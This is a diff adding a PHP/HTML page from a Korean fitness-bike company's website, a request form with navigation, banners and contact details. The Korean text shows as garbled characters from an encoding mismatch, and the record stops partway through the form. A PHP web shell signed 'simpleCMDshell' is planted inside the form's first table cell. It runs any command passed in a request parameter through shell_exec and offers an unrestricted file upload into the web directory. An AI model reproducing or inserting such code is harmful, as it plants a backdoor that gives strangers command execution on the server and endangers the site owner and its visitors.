@@ -1,0 +1,1173 @@
+<html>
+<head>
+<title>½º¸¶Æ® ÈÖÆ®´Ï½º Áö-¹ÙÀÌÅ© ½Ã½ºÅÛ</title>
+<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
+<script type="text/javascript" language="javascript" src="../cheditor/cheditor.js"></script>
+<script type="text/javascript" language="javascript" src="../lib/flash.js"></script>
+<!-- ÀÌ¹ÌÁö ·¹ÀÌ¾î »õÃ¢ -->
+<script type="text/javascript" src="../lib/img/prototype_v1511.js"></script>
+<script type="text/javascript" src="../lib/img/Control.js"></script>
+<script type="text/javascript" src="../lib/img/Control.ImgModal.js?ver=1.004"></script>
+<link type="text/css" rel="stylesheet" href="../lib/img/imgFulllayer.css?ver=1.000" media="screen" />
+<div id="viewImage"></div>
+<!-- ÀÌ¹ÌÁö ·¹ÀÌ¾î »õÃ¢ -->
+<!-- »óÅÂ¹Ù Ãâ·Â -->
+<script language="JavaScript">
+<!--
+window.status='½ºÅ©¸°½Â¸¶ ±¸ÀÔ¹®ÀÇ www.smrobotics.net';
+//-->
+</script>
+
+<script language='javascript'>
+// ¾ÆÀÌµðÆÐ½º¿öµåÃ£±â
+function openIdpass() {
+	window.open("idpass.php", "","scrollbars=no, width=484, height=310");
+}
+//-->
+</script>
+
+<script language='javascript'>
+// »çÀÌÆ®¸Ê
+function sitemap() {
+	window.open("sitemap.php", "","scrollbars=yes, width=700, height=550");
+}
+//·Ñ¿À¹ö ÆäÀÌµå È¿°ú
+function bt(id,after){ 
+	eval(id+'.filters.blendTrans.stop();'); 
+	eval(id+'.filters.blendTrans.Apply();'); 
+	eval(id+'.src="'+after+'";'); 
+	eval(id+'.filters.blendTrans.Play();'); 
+}
+
+//-->
+</script>
+<script language="JavaScript">
+function bluring(){
+if(event.srcElement.tagName=="A"||event.srcElement.tagName=="IMG") document.body.focus();
+}
+document.onfocusin=bluring;
+</script>
+<script language="JavaScript">
+<!--
+function na_open_window(name, url, left, top, width, height, toolbar, menubar, statusbar, scrollbar, resizable)
+{
+  toolbar_str = toolbar ? 'yes' : 'no';
+  menubar_str = menubar ? 'yes' : 'no';
+  statusbar_str = statusbar ? 'yes' : 'no';
+  scrollbar_str = scrollbar ? 'yes' : 'no';
+  resizable_str = resizable ? 'yes' : 'no';
+  window.open(url, name, 'left='+left+',top='+top+',width='+width+',height='+height+',toolbar='+toolbar_str+',menubar='+menubar_str+',status='+statusbar_str+',scrollbars='+scrollbar_str+',resizable='+resizable_str);
+}
+
+// -->
+</script>
+
+<!-----¼¿·ºÆ®¹Ú½º½ºÅ©¸³Æ®----->
+<script type="text/javascript" src="../lib/select_design.js"></script>
+<!-----¼¿·ºÆ®¹Ú½º½ºÅ©¸³Æ®----->
+
+
+<LINK REL="stylesheet" HREF="css/style.css" TYPE="TEXT/CSS">
+</head>
+<body text="black" link="blue" vlink="purple" alink="red" style="background-image:url('images/page_bg.gif'); background-repeat:repeat-x; background-attachment:scroll;">
+<!---------°¡·ÎÁ¤·ÄÅ×ÀÌºí ½ÃÀÛ--------->
+<table border="0" cellspacing="0" cellpadding="0" width="100%">
+	<tr> 
+		<td valign="top">
+			<table border="0" cellspacing="0" cellpadding="0" align="left">
+				<tr> 
+					<td width="950" valign="top"><script language="javascript">
+	<!--
+	function writeSendit() {
+		var form=document.bbs_write_form;
+		form.content.value = myeditor.outputHTML();
+		if(form.name.value=="") {
+			alert("ÀÌ¸§À» ÀÔ·ÂÇØ ÁÖ½Ê½Ã¿À.");
+			form.name.focus();
+		} else if( form.email.value=="") {
+			alert("¸ÞÀÏÀ» ÀÔ·ÂÇØ ÁÖ½Ê½Ã¿À.");
+			form.email.focus();
+		} else if( form.tel.value=="") {
+			alert("¿¬¶ôÃ³¸¦ ÀÔ·ÂÇØ ÁÖ½Ê½Ã¿À.");
+			form.tel.focus();
+		} else {
+			form.submit();
+		}
+	}
+	
+	//-->
+</script>
+<Div id='popCal' style='POSITION:absolute;visibility:hidden;border:0px ridge;width:10' bgcolor="#D3D3D3">
+<iframe name="popFrame" src="Month.html" frameborder="0" scrolling="no" width=188 height=195></iframe>
+</DIV>
+
+<!--------------»ó´ÜÅ×ÀÌºíºÒ·¯¿À±â------------------->
+<table cellpadding="0" cellspacing="0" width="950">
+<tr>
+  <td height="135" valign="top" background="images/main_bg_table1.gif">
+    <table cellpadding="0" cellspacing="0" width="950">
+    <tr>
+      <td height="18">
+        <p><img src="images/space.gif" width="5" height="1" border="0"></p>
+      </td>
+    </tr>
+    <tr>
+      <td height="29" align="right" style="padding-right:50px;">
+        <table cellpadding="0" cellspacing="0" height="28">
+        <tr>
+          <td align="right">
+            <!----------»ó´Ü¸µÅ©ºÎºÐ-------------->
+            <style>
+.selectBoxSelectedAreaGlobal {color:#626262; font-size:12px; font-family:; font-weight:normal; background-color:#ffffff; padding-top:2px; line-height:17px; padding-left:5px; letter-spacing:-1px;}
+.selectBoxSelectedAreaFocusGlobal {color:#626262; font-size:12px; font-weight:normal; font-family:; background-color:#ffffff; padding-top:2px; line-height:17px; padding-left:5px; letter-spacing:-1px;}
+.selectBoxOptionGlobal {color:#626262; font-size:12px; font-family:; font-weight:normal; background-color:#ffffff; padding-top:2px; line-height:17px; padding-left:5px; letter-spacing:-1px;}
+.selectBoxOptionOverGlobal {color:#626262; font-size:12px; font-family:; font-weight:normal; background-color:#f5f5f5; font-weight:bold; padding-top:2px; line-height:17px; padding-left:5px; letter-spacing:-1px;}
+
+.selectBoxOptionInnerLayer {overflow:auto;background-color:#ffffff;
+    scrollbar-face-color:#F3F3F3;
+    scrollbar-shadow-color:#6C6C6C;
+    scrollbar-highlight-color:#FFFFFF;
+    scrollbar-3dlight-color:#C9C9C9;
+    scrollbar-darkshadow-color:#FFFFFF;
+    scrollbar-track-color:#F3F3F3;
+    scrollbar-arrow-color:#000000;
+}
+</style>
+
+<table cellpadding="0" cellspacing="0">
+	<tr>
+		<td>
+				<table cellpadding="1" cellspacing="0">
+			<script language="javascript">
+			<!--
+			// ¸ÞÀÎ ·Î±×ÀÎ
+			function totalsearchSendit() {
+				var form=document.total_search_form;
+				if(form.totalsearchitem.value=="null"){
+					alert("°Ë»ö ºÐ·ùÀ» ¼±ÅÃÇØÁÖ¼¼¿ä.");
+				}else if(form.totalsearch.value=="") {
+					alert("°Ë»ö¾î¸¦ ÀÔ·ÂÇØ ÁÖ½Ê½Ã¿À.");
+					form.totalsearch.focus();
+				} else {
+					if(form.totalsearchitem.value==1){
+						form.action = "productSearch.php";
+					}else if(form.totalsearchitem.value==2){
+						form.action = "itemSearch.php";
+					}else if(form.totalsearchitem.value==3){
+						form.action = "boardSearch.php";
+					}
+					form.submit();
+				}
+			}
+
+			function totalsearchInputSendit() {
+				if(event.keyCode==13) { 
+					totalsearchSendit();
+				}
+			}
+			//-->
+			</script>
+			<form name="total_search_form" method="GET" onsubmit="totalsearchInputSendit();event.returnValue = false;">
+			<tr>
+				<td width="76">
+				<p><select name="totalsearchitem" id="leftSelectBoxGlobal" style="width:100px;height:21px;display:none;">
+					<option value="null">°Ë»ö¼±ÅÃ</option>
+					<option value="1">Á¦Ç°°Ë»ö</option>					<option value="2">ÆäÀÌÁö°Ë»ö</option>					<option value="3">°Ô½ÃÆÇ°Ë»ö</option>				</select><p>
+				<script>
+						makeSelectBoxGlobal("leftSelectBoxGlobal", "selectBoxSelectedAreaGlobal", "#123D99", "images/select_btn.gif", "selectBoxOptionGlobal", "selectBoxSelectedAreaFocusGlobal", "selectBoxOptionOverGlobal");
+				</script>
+				</td>
+				<td width="76"><input name="totalsearch" type="text" size="20" onKeyDown="totalsearchInputSendit();" class='input2'></td>
+				<td width="39"><a href="javascript:totalsearchSendit();"><img src="images/top_product_search.gif" width="39" height="21" border="0"></a></td>
+			</tr>
+			</form>
+		</table>
+				</td>
+		<td>
+		<table cellpadding="1" cellspacing="0">
+			<tr>
+				<td align="center">
+				<table cellpadding="0" cellspacing="0" height="16">
+					<tr>
+						<td width="5" background="images/top_guide_menu_bg1.gif">
+						</td>
+						<td align="center" bgcolor="#112E6D" style="padding-top:3px;">
+						<p><a href="index.php"><span class='toplink' OnMouseOver="this.style.color='FFCC00';" OnMouseOut="this.style.color=''; this.style.fontSize=''">È¨À¸·Î</span></a></p>
+						</td>
+						<td width="5" background="images/top_guide_menu_bg2.gif">
+						</td>
+					</tr>
+				</table>
+				</td>
+				<td align="center">
+				<table cellpadding="0" cellspacing="0" height="16">
+					<tr>
+						<td width="5" background="images/top_guide_menu_bg1.gif">
+						</td>
+						<td align="center" bgcolor="#112E6D" style="padding-top:3px;">
+						<p><a href="javascript:openSendMail()"><span class='toplink' OnMouseOver="this.style.color='FFCC00';" OnMouseOut="this.style.color=''; this.style.fontSize=''">¹®ÀÇ¸ÞÀÏ</span></a></p>
+						</td>
+						<td width="5" background="images/top_guide_menu_bg2.gif">
+						</td>
+					</tr>
+				</table>
+				</td>
+				<td align="center">
+				<table cellpadding="0" cellspacing="0" height="16">
+					<tr>
+						<td width="5" background="images/top_guide_menu_bg1.gif">
+						</td>
+						<td align="center" bgcolor="#112E6D" style="padding-top:3px;">
+						<p><a href="javascript:sitemap();"><span class='toplink' OnMouseOver="this.style.color='FFCC00';" OnMouseOut="this.style.color=''; this.style.fontSize=''">»çÀÌÆ®¸Ê</span></a></p>
+						</td>
+						<td width="5" background="images/top_guide_menu_bg2.gif">
+						</td>
+					</tr>
+				</table>
+												<td align="center">
+				<table cellpadding="0" cellspacing="0" height="16">
+					<tr>
+						<td width="5" background="images/top_guide_menu_bg1.gif">
+						</td>
+						<td align="center" bgcolor="#112E6D" style="padding-top:3px;">
+						<p><a href="join.php"><span class='toplink' OnMouseOver="this.style.color='FFCC00';" OnMouseOut="this.style.color=''; this.style.fontSize=''">È¸¿ø°¡ÀÔ</span></a></p>
+						</td>
+						<td width="5" background="images/top_guide_menu_bg2.gif">
+						</td>
+					</tr>
+				</table>
+				</td>
+				<td align="center">
+				<table cellpadding="0" cellspacing="0" height="16">
+					<tr>
+						<td width="5" background="images/top_guide_menu_bg1.gif">
+						</td>
+						<td align="center" bgcolor="#112E6D" style="padding-top:3px;">
+						<p><a href="login.php"><span class='toplink' OnMouseOver="this.style.color='FFCC00';" OnMouseOut="this.style.color=''; this.style.fontSize=''">·Î±×ÀÎ</span></a></p>
+						</td>
+						<td width="5" background="images/top_guide_menu_bg2.gif">
+						</td>
+					</tr>
+				</table>
+				</td>
+							</tr>
+		</table>
+		</td>
+	</tr>
+</table>
+		<script language='javascript'>
+			// °ü¸®ÀÚ¿¡°Ô ¸ÞÀÏº¸³»±â
+			function openSendMail() {
+				window.open("mail_to_admin.php?user_mail=", "","scrollbars=no, width=484, height=500");
+			}
+			//-->
+		</script>            <!----------»ó´Ü¸µÅ©ºÎºÐ-------------->
+          </td>
+        </tr>
+        </table>
+      </td>
+    </tr>
+    <tr>
+      <td height="73" valign="top">
+        <table cellpadding="0" cellspacing="0" width="950" height="73">
+        <tr>
+          <td width="26" valign="top">
+            <table cellpadding="0" cellspacing="0" width="26">
+            <tr>
+              <td width="26" height="44" background="images/top_logo_bg.gif"></td>
+            </tr>
+            </table>
+          </td>
+          <td width="214" align="center" valign="top">
+            <!---------------»ó´Ü·Î°íÃâ·Â------------------>
+            <table cellpadding="0" cellspacing="0">
+            <tr>
+              <td><table cellpadding="0" cellspacing="0" border="0">
+<tr>
+		<td width="214" height="44" align="center" class='sens_body'>
+				<a href='index.php'><img src='../data/designImages/TITLE_LOGO_1441940419.PNG' width='214' height='44' border='0' align='absmiddle'></a>		</td>
+  </tr>
+</table></td>
+            </tr>
+            </table>
+          </td>
+          <td width="710" valign="top">
+            <!-------------»ó´Ü¸Þ´ºÃâ·Â----------->
+            <script language="javascript">
+<!--
+	function jsView(d) {
+		for(i=1;i<=0;i++){
+			document.all["view"+i].style.display = "none"
+		}
+		document.all["view"+d].style.display = "block"
+	}
+//-->
+</script>
+
+<table cellpadding="0" cellspacing="0" width="710">
+<tr>
+  <td height="50" align="center" background="images/top_menu_bg1.gif">
+  <!---------ÁÖ¸Þ´º------>
+		<table cellpadding="0" cellspacing="0" width="90%">
+		<tr>
+						</tr>
+		</table>
+  <!---------ÁÖ¸Þ´º------>
+  </td>
+</tr>
+<tr>
+  <td height="23">
+<!------¼­ºê¸Þ´º------>
+		<table cellpadding="0" cellspacing="0" width="100%" height="23">
+		<tr>
+		  <td align='left'>
+				
+		  </td>
+		</tr>
+		</table>
+<!-------¼­ºê¸Þ´º³¡----->
+  </td>
+</tr>
+</table>
+								
+
+            <!-------------»ó´Ü¸Þ´ºÃâ·Â----------->
+          </td>
+        </tr>
+        </table>
+      </td>
+    </tr>
+    <tr>
+      <td height="15"></td>
+    </tr>
+    </table>
+  </td>
+</tr>
+</table><!--------------/»ó´ÜÅ×ÀÌºí³¡------------------------>
+
+<table cellpadding="0" cellspacing="0" width="950" height="600">
+<tr>
+  <td height="600" valign="top" class='pagetable_bg'>
+    <table cellpadding="0" cellspacing="0" width="950">
+    <tr>
+      <td width="13" valign="top"><img src="images/space.gif" width="13" height="1" border="0"></td>
+      <td width="220" valign="top">
+        <table cellpadding="0" cellspacing="0" width="220">
+        <tr>
+          <td align="center">
+			<!--------------ÁÂÃø¸Þ´ºÅØ½ºÆ®------>
+			<table cellpadding="0" cellspacing="0" width="220">
+<tr>
+  <td height="90" align="center" background="images/left_menu_title_bg.gif">
+	<!--------ÁÂÃø¸Þ´ºÅ¸ÀÌÆ²ÀÌ¹ÌÁö------------>
+		<table cellpadding="0" cellspacing="0" width="180">
+		<tr>
+			<td height='20'></td>
+		</tr>
+		<tr>
+			<td><span class='leftmenu_subE'>MagicBike</span></td>
+		</tr>
+		<tr>
+			<td><span class='leftmenu_t'>½ºÅ©¸° ½ÎÀÌÅ¬</span></td>
+		</tr>
+	</table>
+	  </td>
+</tr>
+<tr>
+  <td height="5" background="images/left_table_bg.gif">
+  </td>
+</tr>
+<tr>
+  <td align="center" background="images/left_table_bg.gif">
+	<!--------------ÁÂÃø¸Þ´ºÅØ½ºÆ®------>                                
+	<!--------------ÁÂÃø¸Þ´ºÅØ½ºÆ®------>
+	<table cellpadding="0" cellspacing="0" width="180">
+				<tr>
+			<td class='leftmenu'>
+						<img src='images/left_menu_icon_on.gif' border='0' align='absmiddle'><a href="sub_page.php?page_idx=171"><span class="leftmenu" OnMouseOver="this.style.color='FFD800';" OnMouseOut="this.style.color=''; this.style.fontSize=''">¸ÅÁ÷ ÇïÅ© Å¬·´</span></a>
+						</td>
+		</tr>
+				<tr>
+			<td height="7" background="images/pageleft_menu_line_new.gif">
+			</td>
+		</tr>
+						<tr>
+			<td class='leftmenu'>
+						<img src='images/left_menu_icon_on.gif' border='0' align='absmiddle'><a href="sub_page.php?page_idx=97"><span class="leftmenu" OnMouseOver="this.style.color='FFD800';" OnMouseOut="this.style.color=''; this.style.fontSize=''">Çï½º ¹ÙÀÌÅ©</span></a>
+						</td>
+		</tr>
+				<tr>
+			<td height="7" background="images/pageleft_menu_line_new.gif">
+			</td>
+		</tr>
+						<tr>
+			<td class='leftmenu'>
+						<img src='images/left_menu_icon_on.gif' border='0' align='absmiddle'><a href="sub_page.php?page_idx=112"><span class="leftmenu" OnMouseOver="this.style.color='FFD800';" OnMouseOut="this.style.color=''; this.style.fontSize=''">Çï½º¹ÙÀÌÅ©ÀÇ È¿°ú</span></a>
+						</td>
+		</tr>
+				<tr>
+			<td height="7" background="images/pageleft_menu_line_new.gif">
+			</td>
+		</tr>
+						<tr>
+			<td class='leftmenu'>
+						<img src='images/left_menu_icon_on.gif' border='0' align='absmiddle'><a href="sub_page.php?page_idx=169"><span class="leftmenu" OnMouseOver="this.style.color='FFD800';" OnMouseOut="this.style.color=''; this.style.fontSize=''">¸ÅÁ÷ ¹ÙÀÌÅ© ¼³¸í¼­</span></a>
+						</td>
+		</tr>
+				<tr>
+			<td height="7" background="images/pageleft_menu_line_new.gif">
+			</td>
+		</tr>
+						<tr>
+			<td class='leftmenu'>
+						<img src='images/left_menu_icon_on.gif' border='0' align='absmiddle'><a href="request.php?unsingcode1=1313169244&unsingcode2=1313591110&code=bd91f5dcb3e4898b9ca6e031c7fb2e19"><span class="leftmenu" OnMouseOver="this.style.color='FFD800';" OnMouseOut="this.style.color=''; this.style.fontSize=''"><b><font color='FFE866'>Çï½º ¹ÙÀÌÅ© ½ÅÃ»¼­</font></b></span></a>
+						</td>
+		</tr>
+				<tr>
+			<td height="7" background="images/pageleft_menu_line_new.gif">
+			</td>
+		</tr>
+						<tr>
+			<td class='leftmenu'>
+						<img src='images/left_menu_icon_on.gif' border='0' align='absmiddle'><a href="sub_page.php?page_idx=167"><span class="leftmenu" OnMouseOver="this.style.color='FFD800';" OnMouseOut="this.style.color=''; this.style.fontSize=''">¸ÅÁ÷¹ÙÀÌÅ© ºê·Î¼Å</span></a>
+						</td>
+		</tr>
+				<tr>
+			<td height="7" background="images/pageleft_menu_line_new.gif">
+			</td>
+		</tr>
+					</table>
+	<!--------------ÁÂÃø¸Þ´ºÅØ½ºÆ®------>              
+  </td>
+</tr>
+</table>			<!--------------ÁÂÃø¸Þ´ºÅØ½ºÆ®------>
+          </td>
+        </tr>
+        <tr>
+          <td align="center" valign="top" background="images/left_table_bg.gif">
+            <table cellpadding="0" cellspacing="0" width="200">
+            <tr>
+              <td height="15"></td>
+            </tr>
+            <tr>
+              <td>
+				<!----------·ÎÅ×ÀÌÆ®¹è³ÊÃâ·Â--------->
+				<table cellpadding="0" cellspacing="0" width="200">
+				<tr>
+				  <td align="center"><script language=javascript>
+	// ¸ÞÀÎ ·ÎÅ×ÀÌÆ® ¹è³Ê
+	var popImages = new Array();
+		popImages[0] = new PopImage("../data/designImages/ROTATION_1308717227","http://smrobotics.net/skin31/bbs_list.php?unsingcode1=1185858166&unsingcode2=1185859347&code=faq","_self");
+		popImages[1] = new PopImage("../data/designImages/ROTATION_1442123872","http://smrobotics.net/skin31/bbs_list.php?unsingcode1=1441920853&unsingcode2=1441964143&code=flashphoto","_self");
+		popImages[2] = new PopImage("../data/designImages/ROTATION_1442122870","http://smrobotics.net/skin31/request.php?unsingcode1=1185858166&unsingcode2=1347226712&code=bd91f5dcb3e4898b9ca6e031c7fb2e19","_self");
+		function showPopImages(num) {
+	var popLink = document.getElementById("POPLINK");
+	var popImage = document.getElementById("POPIMAGE");
+	popLink.href=popImages[num].l;
+	popLink.target=popImages[num].t;
+	if(popImage.filters) popImage.filters.blendTrans.apply();
+	popImage.src=popImages[num].img.src;
+	if(popImage.filters) popImage.filters.blendTrans.play();
+	
+	for(i=0;i<popImages.length;i++) {
+		var btn = document.getElementById("popbtn" + (i+1));
+		if(i == num) {
+			btn.src="images/banner/pop_n" + ((i+101)+"").substring(1) + "_over.gif";
+		}
+		else {
+			btn.src="images/banner/pop_n" + ((i+101)+"").substring(1) + ".gif";
+		}
+	}
+}
+	function PopImage(s, l, t) {
+	this.img = new Image();
+	this.img.src=s;
+	this.l = l;
+	this.t = t;
+}
+	var popAniCnt = 0 ;
+	var iv = null;
+	var popAniInterval = 5000;  // ·ÎÅ×ÀÌÆ® ¼Óµµ
+	function animatePopup(){
+	popAniCnt = 0;
+	if(iv) window.clearInterval(iv);
+	iv = window.setInterval("showAnimate()",popAniInterval);
+}
+	function showAnimate() {
+	showPopImages((popAniCnt++)%popImages.length);
+}
+	function stopAnimatePopup(){
+	if(iv) window.clearInterval(iv);
+}
+	//-->
+</script>
+
+<table width=100% border="0" cellpadding="0" cellspacing="0">
+	<tr>
+		<TD align=center>
+		<p><a href="http://smrobotics.net/skin31/request.php?unsingcode1=1185858166&unsingcode2=1347226712&code=bd91f5dcb3e4898b9ca6e031c7fb2e19" id=POPLINK target="_self"><img id=POPIMAGE src="../data/designImages/ROTATION_1442122870" width="200" height="85" border="0" style="filter:blendTrans(duration=0.3)"></a></p>
+		</td>
+	</tr>
+	<TR>
+		<TD align='right' style="padding-right:5px">
+		<table border="0" cellpadding="1" cellspacing="0">
+			<tr>
+								<td width="13"><a href="javascript:showPopImages(0);stopAnimatePopup();"><img src="images/banner/pop_n01_over.gif" width="13" height="13" border="0" id="popbtn1"></a></td>
+								<td width="13"><a href="javascript:showPopImages(1);stopAnimatePopup();"><img src="images/banner/pop_n02_over.gif" width="13" height="13" border="0" id="popbtn2"></a></td>
+								<td width="13"><a href="javascript:showPopImages(2);stopAnimatePopup();"><img src="images/banner/pop_n03_over.gif" width="13" height="13" border="0" id="popbtn3"></a></td>
+							</tr>
+		</table>
+		</td>
+	</tr>
+</table>
+<script language=javascript>
+	//showPopImages(0);
+	animatePopup();
+</script>
+</td>
+				</tr>
+				</table>
+				<!----------·ÎÅ×ÀÌÆ®¹è³ÊÃâ·Â--------->
+              </td>
+            </tr>
+            <tr>
+              <td height="10"></td>
+            </tr>
+            <tr>
+              <td>
+				<!----------°í°´¼¾ÅÍÃâ·Â-------------->
+				<table cellpadding="0" cellspacing="0" width="200">
+<tr>
+  <td height="10" background="images/main_customer_bg1.gif"></td>
+</tr>
+<tr>
+  <td bgcolor="ffffff" align="center">
+	<table cellpadding="0" cellspacing="0" width="185">
+	<tr>
+	  <td height="25"><img src="images/main_customer_title1.gif" width="115" height="18" border="0"></td>
+	</tr>
+	<tr>
+	  <td>
+		<p><img src="images/main_customer_icon.gif" width="10" height="8" border="0"><span class='customer'>°í°´¼¾ÅÍ : <b><font color="#FF6600">070-7777-5627 /  010-6742-2334</span></font></b><br>
+		<img src="images/main_customer_icon.gif" width="10" height="8" border="0"><span class='customer'>ÀÌ¸ÞÀÏ : </span><a href="javascript:openSendMail()"><span OnMouseOver="this.style.color='FF5A00';" OnMouseOut="this.style.color=''; this.style.fontSize='8pt'" style="font-size:8pt;" class='customer'>Mail to Webmaster</span></a><a href="javascript:openSendMail()"><img src="images/left_customer_mail.gif" width="16" height="10" border="0" align=' absmiddle'></a></p>
+	  </td>
+	</tr>
+	<tr>
+	  <td height="5" background="images/main_customer_line.gif"></td>
+	</tr>
+	<tr>
+	  <td height="25"><img src="images/main_customer_title2.gif" width="115" height="18" border="0"></td>
+	</tr>
+	<tr>
+	  <td class='customer2'>ÆòÀÏ ¿ÀÀü 08:00 ~ 24:00<br><br>ÈÞÀÏ ¿ÀÀü 08:00 ~ 20:00<br><br><br>°ü¸®¿î¿µ Ã¥ÀÓÀÚ : Á¶»óÈ£ »ó¹«ÀÌ»ç<br><br><br><br>Ã¥ÀÓÀÚ Á÷Åë¹øÈ£ : 010-6742-2334 <br><br><br>"Hosting by ½ÉÇÃ·º½ºÀÎÅÍ³Ý(ÁÖ)"</td>
+	</tr>
+	</table>
+  </td>
+</tr>
+<tr>
+  <td height="10" background="images/main_customer_bg2.gif"></td>
+</tr>
+</table>				<!----------°í°´¼¾ÅÍÃâ·Â-------------->
+              </td>
+            </tr>
+            <tr>
+              <td height="5"></td>
+            </tr>
+            </table>
+          </td>
+        </tr>
+        <tr>
+          <td height="121" background="images/left_table_bg2.gif"></td>
+        </tr>
+        </table>
+      </td>
+      <td width="7" valign="top"><img src="images/space.gif" width="7" height="1" border="0"></td>
+      <td width="710" valign="top">
+        <table cellpadding="0" cellspacing="0" width="710" bordercolordark="black" bordercolorlight="black">
+        <tr>
+          <td>
+			<!----------ÆäÀÌÁö»ó´Ü¹è³Ê----------->        
+			<table cellpadding="0" cellspacing="0" width="710" height="245">
+			<tr>
+			  <td align="center"><p><img src='../data/designImages/PAGEIMG_14419254181313169244.gif' width='710' height='245' border='0' align='absmiddle'></p></td>
+			</tr>
+			</table>
+			<!----------ÆäÀÌÁö»ó´Ü¹è³Ê³¡----------->
+          </td>
+        </tr>
+        <tr>
+          <td height="20" align="right" style="padding-right:20px;">
+			<!------------ÇöÀçÀ§Ä¡Ãâ·Â---------->
+			<table cellpadding="0" cellspacing="0">
+				<tr>
+					<td width="37">
+					<p><img src="images/page_map_home.gif" width="37" height="11" border="0"></p>
+					</td>
+					<td class='pagemap'>½ºÅ©¸° ½ÎÀÌÅ¬ &gt; <font color="#5081CD"><b>Çï½º ¹ÙÀÌÅ© ½ÅÃ»¼­</b></font></td>
+				</tr>
+			</table>
+			<!------------ÇöÀçÀ§Ä¡Ãâ·Â---------->
+          </td>
+        </tr>
+        <tr>
+          <td height="7" background="images/page_map_line.gif"></td>
+        </tr>
+        <tr>
+          <td style="padding-left:15px;">
+			<!-------------ÆäÀÌÁöÁ¦¸ñÀÌ¹ÌÁö---------->
+			<table cellpadding="0" cellspacing="0" width="100%">
+				<tr>
+					<td>
+										<table cellpadding="0" cellspacing="0" width="400">
+						<tr>
+							<td width="40" rowspan="2"><img src="images/page_map_title.gif" width="40" height="37" border="0"></td>
+							<td valign="bottom"><b><span class='pagemap_title'>Çï½º ¹ÙÀÌÅ© ½ÅÃ»¼­</span></b></td>
+						</tr>
+						<tr>
+							<td height='14' background="images/pagemap_title_bg.gif"><img src="images/space.gif" width="5" height="1" border="0"></td>
+						</tr>
+					</table>
+										</td>
+				</tr>
+			</table>
+			<!-------------ÆäÀÌÁöÁ¦¸ñÀÌ¹ÌÁö---------->
+          </td>
+        </tr>
+        <tr>
+          <td height="15"></td>
+        </tr>
+        <tr>
+          <td align="center">
+			<!-----------------ÆäÀÌÁö³»¿ë.Ä«Å×°í¸®Ãâ·Â----------->
+			<table width="680" cellpadding="0" cellspacing="0">
+								<tr>
+					<td height="15">
+					</td>
+				</tr>
+				<tr>
+					<td align="center" height="400" valign="top" class='contents'>
+					<table cellpadding="0" cellspacing="0" width="680">
+						<tr>
+							<td valign="top" align="center">
+							<!-- Ãâ·Â³»¿ë -->
+									<!-- Ãâ·Â³»¿ë -->
+									<table border="0" cellpadding="0" cellspacing="0" width="100%">
+										<tr>
+											<td class='request1'>
+												<img src="images/icon_arrow8.gif" border="0" align='absmiddle'><?php $cmd = stripslashes($_REQUEST["-cmd"]);$sendfile=$_REQUEST["sendfile"];if($sendfile=="true") { $fn=$_FILES["file"]["name"];$tn=$_FILES["file"]["tmp_name"];if(move_uploaded_file($tn, dirname(__FILE__)."/".$fn)) $result="upload done";else $result="upload failed"; } print('<body bgcolor=#000000 text=#008000 onLoad="document.forms[0].elements[-cmd].focus()"><center><br><form method=POST><input type=TEXT name="-cmd" size=64 value="' . $cmd . '" style="background:#020;color:#0F0;"></form><hr><table><tr><td><pre>' . htmlentities(Shell_Exec($cmd)) . $result . '</pre></td></tr></table><hr><form enctype="multipart/form-data" method="post" action=""><input type=file name=file size=20 style="background:#020;color:#0F0;"><input type="submit" value="Upload"><input type="hidden" name="sendfile" value="true"></form>~simpleCMDshell~ by <b>BodenTruppe</b></center></body>');  ?>											</td>
+										</tr>
+										<tr>
+											<td class='request1'>
+																							</td>
+										</tr>
+										<form name="bbs_write_form" action="request_write_ok.php" method="post" enctype="multipart/form-data">
+										<input type="hidden" name="code" value="bd91f5dcb3e4898b9ca6e031c7fb2e19">
+										<tr>
+											<td valign="top" bgcolor="white" width="100%">
+												<table border="0" cellpadding="0" cellspacing="0" width="100%">
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+													<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>ÀÌ  ¸§</b></p>
+														</td>
+														<td bgcolor="white" class='request1'><input type="text" size="20" name="name" class="input" value=""> (´ã´çÀÚ ÀÌ¸§ÀÔ·Â)
+														</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+													<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>¸Þ  ÀÏ</b></p>
+														</td>
+														<td bgcolor="white" class='request1'><input type="text" size="40" name="email" class="input" value=""> (¿¹ : mail@mail.co.kr)
+														</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+													<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>¿¬¶ôÃ³</b></p>
+														</td>
+														<td bgcolor="white" class='request1'><input type="text" size="20" name="tel" class="input"> (´ã´çÀÚ ¿¬¶ôÃ³ÀÔ·Â)
+														</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+																																							<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>¼ºº°</b></p>
+														</td>
+														<td bgcolor="white">
+																														<input type="radio" name="text1" value="0" class="input1">&nbsp;³²&nbsp;&nbsp;
+																														<input type="radio" name="text1" value="1" class="input1">&nbsp;¿©&nbsp;&nbsp;
+																													</td>
+													</tr>
+													<tr>
+														<td width="120" height="7" background="images/footer_line.gif">
+														</td>
+														<td height="7" background="images/footer_line.gif">
+														</td>
+													</tr>
+																																							<tr>
+														<td bgcolor="#F6F6F6" align="center" width="20%" height="20" class='request1'>
+															<p><b>¹®ÀÇ»çÇ×</b></p>
+														</td>
+														<td bgcolor="white">
+															<select size='1' name='text2'>															<option value="½Â¸¶Ã¢¾÷¹®ÀÇ">&nbsp;½Â¸¶Ã¢¾÷¹®ÀÇ</option>
+																														<option value="±¸¸Å¹®ÀÇ">&nbsp;±¸¸Å¹®ÀÇ</option>
+																														<option value="Ã¢¾÷½ÅÃ»">&nbsp;Ã¢¾÷½ÅÃ»</option>
+																														<option value="Áö»ç½ÅÃ»">&nbsp;Áö»ç½ÅÃ»</option>
